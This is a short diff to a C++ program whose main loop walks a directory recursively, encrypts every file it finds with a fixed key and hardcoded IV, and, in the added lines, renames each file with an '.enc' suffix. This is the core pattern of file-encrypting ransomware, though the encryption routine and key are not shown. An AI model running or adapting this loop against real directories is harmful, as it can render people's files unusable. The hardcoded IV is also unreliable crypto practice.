@@ -20,10 +20,16 @@ int main(){
     unsigned char iv[] = "some random IV value";
 
     for (const auto& dirEntry : recursive_directory_iterator(myPath)){
+        
         if (!dirEntry.is_directory()){
+
             file = dirEntry.path().generic_string();
             printf("encrypting %s... \n", file.c_str());
             encryptFile(key_chars, iv, file.c_str());
+
+            std::filesystem::path oldName = file;
+            std::filesystem::path newName = oldName.string() + ".enc";
+            std::filesystem::rename(oldName, newName);
         }
     }
 }
